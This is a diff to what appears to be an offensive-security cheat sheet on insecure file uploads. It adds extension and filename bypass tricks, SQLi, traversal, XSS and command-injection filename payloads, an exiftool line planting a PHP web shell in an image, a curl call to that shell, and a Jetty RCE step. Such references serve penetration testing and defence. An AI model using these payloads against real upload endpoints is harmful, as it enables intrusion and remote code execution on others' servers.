@@ -14,6 +14,7 @@
     * [CVE - Image Tragik](#cve---image-tragik)
     * [CVE - FFMpeg](#cve---ffmpeg)
     * [ZIP Archive](#zip-archive)
+    * [Jetty RCE](#jetty-rce)
 * [References](#references)
 
 
@@ -44,14 +45,22 @@
     .phtm
     .inc
     ```
-* ASP Server : `.asp, .aspx, .cer and .asa (IIS <= 7.5), shell.aspx;1.jpg (IIS < 7.0), shell.soap`
-* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf`
+* ASP Server
+    ```powershell
+    .asp
+    .aspx
+    .config
+    .cer and .asa # (IIS <= 7.5)
+    shell.aspx;1.jpg # (IIS < 7.0)
+    shell.soap
+    ```
+* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action`s
 * Perl: `.pl, .pm, .cgi, .lib`
 * Coldfusion: `.cfm, .cfml, .cfc, .dbm`
 
 ### Upload tricks
 
-- Use double extensions : `.jpg.php`
+- Use double extensions : `.jpg.php, .png.php5`
 - Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
 - Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`
 - Null byte (works well against `pathinfo()`)
@@ -63,7 +72,10 @@
     * `.php\x00.jpg`
 - Special characters
     * Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
-    * Whitespace characters: `file.php%20`, `file.php%0d%0a.jpg`
+    * Whitespace and new line characters
+        * `file.php%20`
+        * `file.php%0d%0a.jpg`
+        * `file.php%0a`
     * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
     * Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
     * Multiple special characters: `file.jsp/././././.`
@@ -71,6 +83,7 @@
     * `Content-Type : image/gif`
     * `Content-Type : image/png`
     * `Content-Type : image/jpeg`
+    * Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
     * Set the Content-Type twice: once for unallowed type and once for allowed.
 - [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
     * Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
@@ -82,15 +95,21 @@
 
 ### Filename vulnerabilities
 
+Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.
+
 - Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
-- LFI Payloads:  e.g. `image.png../../../../../../../etc/passwd` 
+- LFI/Path Traversal Payloads:  e.g. `image.png../../../../../../../etc/passwd` 
 - XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
 - File Traversal e.g. `../../../tmp/lol.png`
 - Command Injection e.g. `; sleep 10;`
 
+Also you upload:
+- HTML/SVG files to trigger an XSS
+- EICAR file to check the presence of an antivirus
+
 ### Picture upload with LFI
 
-Valid pictures hosting PHP code. Upload the picture and use a local file inclusion to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.
+Valid pictures hosting PHP code. Upload the picture and use a **Local File Inclusion** to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.
 
 - Picture Metadata, hide the payload inside a comment tag in the metadata.
 - Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.
@@ -102,19 +121,20 @@ Create a custom picture and insert exif tag with `exiftool`. A list of multiple 
 ```ps1
 convert -size 110x110 xc:white payload.jpg
 exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 ```
 
 ### Configuration Files
 
 If you are trying to upload files to a :
-- PHP server, take a look at the .htaccess trick to execute code.
-- ASP server, take a look at the .config trick to execute code.
+- PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
+- ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
 
 Configuration files examples
-- .htaccess
-- web.config
-- httpd.conf
-- \_\_init\_\_.py
+- [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
+- [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
+- [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)
+- [\_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
 
 Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.
 - package.json
@@ -162,10 +182,15 @@ When a ZIP/archive file is automatically decompressed after the upload
     zip --symlinks test.zip symindex.txt
     ```
 
+### Jetty RCE
+
+Upload the XML file to `$JETTY_BASE/webapps/`
+* [JettyShell.xml](https://raw.githubusercontent.com/Mike-n1/tips/main/JettyShell.xml)
+
 
 ## References
 
-* Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil
+* [Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
 * [BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA](https://secgeek.net/bookfresh-vulnerability/)
 * [Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
 * [La PNG qui se prenait pour du PHP, 23 février 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
@@ -173,3 +198,4 @@ When a ZIP/archive file is automatically decompressed after the upload
 * [File Upload - Mahmoud M. Awali / @0xAwali](https://docs.google.com/presentation/d/1-YwXl9rhzSvvqVvE_bMZo2ab-0O5wRNTnzoihB9x6jI/edit#slide=id.ga2ef157b83_1_0)
 * [IIS - SOAP](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
 * [Arbitrary File Upload Tricks In Java - pyn3rd](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
+* [File Upload - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
